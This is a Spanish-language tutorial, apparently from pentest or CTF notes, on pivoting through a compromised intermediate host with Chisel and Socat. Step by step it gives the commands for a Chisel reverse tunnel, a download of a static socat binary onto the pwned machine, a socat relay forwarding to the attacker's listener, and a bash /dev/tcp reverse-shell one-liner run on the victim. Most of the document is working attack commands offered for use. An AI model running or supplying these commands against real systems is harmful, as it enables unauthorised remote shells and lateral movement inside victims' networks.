# Pivoting Avanzado con Socat

## Introducción

Cuando obtenemos **RCE en una máquina dentro de una red interna** que no tiene acceso directo hacia nuestro host, necesitamos técnicas de **pivoting** para:

1. Alcanzar la máquina víctima desde nuestro host.
2. Redirigir tráfico desde la víctima hacia nuestro host, atravesando máquinas intermedias.

**Escenario:**

* **Máquina víctima:** `172.19.0.4` (webshell).
* **Máquina intermedia:** `172.19.0.3` (root, con Chisel cliente).
* **Host local atacante:** `10.10.14.3` (Chisel servidor).

Objetivo: obtener una **reverse shell desde la víctima hacia nuestro host**, atravesando la máquina intermedia.

---

## Paso 1: Chisel como túnel reverso

Chisel permite crear un **túnel TCP reverso** para exponer servicios internos de la red hacia nuestro host.

### Configuración:

**En el host local (atacante):**

```bash
sudo ./chisel server --reverse -p 1234
```

* `--reverse`: indica que aceptará conexiones reversas.
* `-p 1234`: puerto del servidor en el host local.

**En la máquina intermedia (`172.19.0.3`):**

```bash
./chisel client 10.10.14.3:1234 R:8080:172.19.0.3:80
```

* `R:8080:172.19.0.3:80`: crea un **reverse port forward**. Todo lo que llegue al puerto `8080` del host local será redirigido al puerto `80` de la intermedia.
* Requiere **root** si el puerto de destino es menor a `1024` (ej. `R:80`).

> Con esto, ya tenemos conectividad desde nuestro host hacia la red interna a través de la intermedia.

---

## Paso 2: Socat como pivoting dinámico

Aunque Chisel nos da conectividad, no podemos recibir **reverse shells directas** de la víctima si no hay acceso hacia nuestro host. Aquí entra **Socat**.

### Preparación de Socat (Máquina Intermedia Pwned)

1. Descargar un binario estático de Socat en la **máquina intermedia**:

```bash
wget https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat -O socat
chmod +x socat
```

2. Configurar el pivoting:

```bash
./socat TCP-LISTEN:1111,fork TCP:10.10.14.3:2222 &
```

**Explicación del comando:**

* `TCP-LISTEN:1111,fork`: escucha conexiones entrantes en el puerto `1111` de la intermedia.
* `TCP:10.10.14.3:2222`: reenvía todo el tráfico hacia nuestro host local en el puerto `2222`.
* `&`: ejecuta Socat en background.

> Ahora cualquier conexión enviada a la intermedia en el puerto `1111` se reenviará automáticamente a nuestro listener en `2222`.

---

## Paso 3: Reverse shell desde la víctima

1. Abrimos un listener en nuestro host local:

```bash
nc -lvnp 2222
```

2. En la víctima (`172.19.0.4`), lanzamos la reverse shell hacia la máquina intermedia:

```bash
bash -i >& /dev/tcp/172.19.0.3/1111 0>&1
```

**Flujo de la conexión:**

```
[Victima 172.19.0.4] ---> 1111 ---> [Socat en Intermedia 172.19.0.3] ---> 2222 ---> [Host 10.10.14.3]
```

* La reverse shell se conecta a la intermedia en `1111`.
* Socat reenvía la conexión hacia nuestro host en `2222`.
* Nuestro listener `nc` recibe la shell y nos da acceso interactivo a la víctima.

---

## Paso 4: Consideraciones

* **Root en la intermedia:** necesario para puertos < 1024.
* **Socat + Chisel:** permiten pivoting completo y dinámico, incluso en redes segmentadas.
* Esta técnica es muy útil en **post-explotación y movimiento lateral**, cuando necesitamos acceder a máquinas que no tienen conexión directa hacia nuestro host.
* Siempre mantener **background processes** bajo control para evitar dejar túneles abiertos accidentalmente.